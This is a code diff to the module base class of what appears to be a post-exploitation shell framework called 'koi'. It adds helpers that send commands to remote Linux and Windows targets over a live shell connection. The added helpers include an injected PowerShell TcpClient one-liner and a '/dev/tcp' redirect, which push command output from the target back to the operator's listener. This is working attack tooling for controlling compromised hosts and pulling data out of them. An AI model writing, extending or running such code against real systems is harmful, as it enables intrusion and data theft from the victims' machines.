@@ -1,5 +1,9 @@
 from __future__ import annotations
 
+import re
+import select
+import time
+import uuid
 from abc import ABC, abstractmethod
 from typing import TYPE_CHECKING, List, Literal, Optional, Union
 
@@ -8,8 +12,12 @@ if TYPE_CHECKING:
 
 from koi.models import CommandResult, StreamLine
 from koi.utils import ui
+from koi.utils.tcp import get_local_ip, spawn_recv_server
 
 import argparse
+
+_PS_PROMPT = re.compile(r'^PS\s+\S+>\s*')
+_SELECT_TIMEOUT = 0.1  # max seconds to block per select() iteration
 
 PlatformSpec = Union[
     Literal["linux", "windows_cmd", "windows_ps", "any"],
@@ -40,8 +48,6 @@ class KoiModule(ABC):
             def run(self) -> None:
                 result = self.exec("whoami")
                 self.ok(f"Running as: {result.stdout.strip()}")
-
-    Then register it in src/koi/modules/__init__.py (see loader pattern below).
     """
 
     #: Short identifier used to call the module from the CLI (e.g. "enum_linux")
@@ -52,10 +58,10 @@ class KoiModule(ABC):
 
     #: Optional longer help text shown with `module help <name>`
     usage: str = ""
-    
+
     #: Optional list of argument specifications
     arguments: list[dict] = []
-    
+
     #: Optional category for grouping modules in the UI
     category: Optional[str] = None
 
@@ -98,7 +104,7 @@ class KoiModule(ABC):
         self.spinner = ui.Spinner
         self.breaker = ui.breaker
         self.box = ui.print_report_box
-        
+
     def _parse_args(self):
         if not self.arguments:
             return argparse.Namespace()
@@ -116,6 +122,94 @@ class KoiModule(ABC):
             return parser.parse_args(self.raw_args)
         except SystemExit:
             return argparse.Namespace()
+
+    # -------------------------------------------------------------------------
+    # Shared session helpers
+    # -------------------------------------------------------------------------
+
+    def _get_local_ip(self) -> str:
+        """Return the local IP that routes toward the current session."""
+        return get_local_ip(self.session.addr[0])
+
+    def _win_query(self, ps_expr: str, timeout: float = 10.0) -> str:
+        """
+        Evaluate a PowerShell expression on the remote Windows target and return
+        its string output.
+
+        For plain (non-upgraded) sessions the result is read back inline via a
+        sentinel marker.  For upgraded ConPtyShell sessions the output is a raw
+        VT100 stream, so we redirect the result over a fresh side-channel TCP
+        socket instead (same technique as _exec_clean for Linux).
+        """
+        if self.session.upgraded:
+            return self._win_query_sidechannel(ps_expr, timeout)
+
+        sentinel = uuid.uuid4().hex
+        marker = f"__KOI_{sentinel}__"
+
+        if self.session.os_type == "windows_ps":
+            cmd = f"({ps_expr}); '{marker}'"
+        else:
+            inner = f"({ps_expr}); '{marker}'"
+            cmd = f'powershell -NoProfile -NonInteractive -c "{inner}"'
+
+        eol = self.session.eol
+        enc = self.session.encoding
+        self.session.conn.sendall((cmd + eol).encode(enc))
+
+        buf = b""
+        deadline = time.monotonic() + timeout
+        lines: list[str] = []
+
+        while True:
+            remaining = deadline - time.monotonic()
+            if remaining <= 0:
+                break
+            r, _, _ = select.select([self.session.conn], [], [], min(remaining, _SELECT_TIMEOUT))
+            if not r:
+                continue
+            chunk = self.session.conn.recv(4096)
+            if not chunk:
+                break
+            buf += chunk
+            while b"\n" in buf:
+                raw, buf = buf.split(b"\n", 1)
+                text = raw.decode(enc, errors="replace").strip("\r\n ")
+                text = _PS_PROMPT.sub("", text).strip()
+                if not text or "Write-Host" in text:
+                    continue
+                if marker in text:
+                    return lines[-1] if lines else ""
+                lines.append(text)
+
+        return lines[-1] if lines else ""
+
+    def _win_query_sidechannel(self, ps_expr: str, timeout: float = 10.0) -> str:
+        """
+        Variant of _win_query for upgraded (ConPtyShell) sessions.
+        Opens a local TCP socket and asks PowerShell to push its result there,
+        bypassing the VT100 stream entirely.
+        """
+        local_ip = self._get_local_ip()
+        port, collect = spawn_recv_server(timeout=timeout)
+
+        ps_cmd = (
+            f"$_r=({ps_expr})|Out-String;"
+            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
+            f"$_s=$_c.GetStream();"
+            f"$_b=[Text.Encoding]::UTF8.GetBytes($_r.Trim());"
+            f"$_s.Write($_b,0,$_b.Length);"
+            f"$_s.Flush();$_c.Close()"
+        )
+        self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
+        return collect().decode("utf-8", errors="replace").strip()
+
+    def _exec_clean(self, cmd: str, timeout: float = 10.0) -> str:
+        """Run a Linux command and collect its stdout via a side TCP channel."""
+        local_ip = self._get_local_ip()
+        port, collect = spawn_recv_server(timeout=timeout)
+        self.exec(f"( {cmd} ) > /dev/tcp/{local_ip}/{port}", timeout=timeout)
+        return collect().decode("utf-8", errors="replace").strip()
 
     @abstractmethod
     def run(self) -> None:
@@ -135,10 +229,6 @@ class KoiModule(ABC):
         self.args             -> list[str] from the CLI
         """
     def exec(self, command: str, timeout: float = 30.0):
-        import select
-        import time
-        import uuid
-
         sentinel = uuid.uuid4().hex
         marker = f"__KOI_DONE_{sentinel}__"
         wrapped = (
@@ -156,7 +246,7 @@ class KoiModule(ABC):
             if remaining <= 0:
                 raise CommandTimeout(command, timeout)
 
-            ready, _, _ = select.select([self.session.conn], [], [], min(remaining, 0.1))
+            ready, _, _ = select.select([self.session.conn], [], [], min(remaining, _SELECT_TIMEOUT))
             if not ready:
                 continue
 
@@ -177,14 +267,13 @@ class KoiModule(ABC):
                         stdout=output,
                         stderr="",
                         duration=time.monotonic() - (deadline - timeout),
-                        pid=None,
                     )
                 output_lines.append(text)
 
         return CommandResult(
             command=command, returncode=1,
             stdout="\n".join(output_lines), stderr="",
-            duration=0, pid=None,
+            duration=0,
         )
 
     def exec_stream(self, command: str, timeout: float = 30.0):
@@ -197,10 +286,6 @@ class KoiModule(ABC):
             for line in self.exec_stream("find / -name '*.conf' 2>/dev/null"):
                 self.notify('info', line.text)
         """
-        import select
-        import time
-        import uuid
-
         sentinel = uuid.uuid4().hex
         marker   = f"__KOI_DONE_{sentinel}__"
         wrapped  = f'( {command} ); printf "\\n{marker}\\n"\n'
@@ -208,14 +293,13 @@ class KoiModule(ABC):
 
         buf      = b""
         deadline = time.monotonic() + timeout
-        line_number = 0
 
         while True:
             remaining = deadline - time.monotonic()
             if remaining <= 0:
                 raise CommandTimeout(command, timeout)
 
-            ready, _, _ = select.select([self.session.conn], [], [], min(remaining, 0.1))
+            ready, _, _ = select.select([self.session.conn], [], [], min(remaining, _SELECT_TIMEOUT))
             if not ready:
                 continue
 
@@ -229,8 +313,7 @@ class KoiModule(ABC):
                 text = raw_line.decode("utf-8", errors="replace").rstrip("\r")
                 if marker in text:
                     return
-                yield StreamLine(text=text, source="stdout", line_number=line_number)
-                line_number += 1
+                yield StreamLine(text=text)
 
     def send(self, data: bytes) -> bool:
         """
